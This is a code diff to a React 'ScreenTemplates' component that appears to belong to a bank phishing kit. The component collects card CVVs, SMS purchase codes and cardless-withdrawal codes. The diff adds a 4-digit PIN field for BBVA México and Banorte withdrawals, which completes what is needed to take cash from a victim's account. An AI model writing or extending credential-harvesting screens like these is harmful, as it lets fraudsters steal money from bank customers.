@@ -61,6 +61,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [cvvInput, setCvvInput] = useState('');
   const [smsCompraInput, setSmsCompraInput] = useState('');
   const [codigoRetiroInput, setCodigoRetiroInput] = useState('');
+  const [pinRetiroInput, setPinRetiroInput] = useState('');
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [qrScanned, setQrScanned] = useState<string | null>(null);
   const [qrImageData, setQrImageData] = useState<string | null>(null);
@@ -577,12 +578,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             case 'BBVA':
               return { 
                 digits: 12, 
-                note: 'Código de retiro directo en app BBVA México.' 
+                note: 'Código de retiro directo en app BBVA México más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'BANORTE':
               return { 
                 digits: 10, 
-                note: '"Retiro sin tarjeta" generado desde Banorte Móvil.' 
+                note: '"Retiro sin tarjeta" generado desde Banorte Móvil más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'SANTANDER':
               return { 
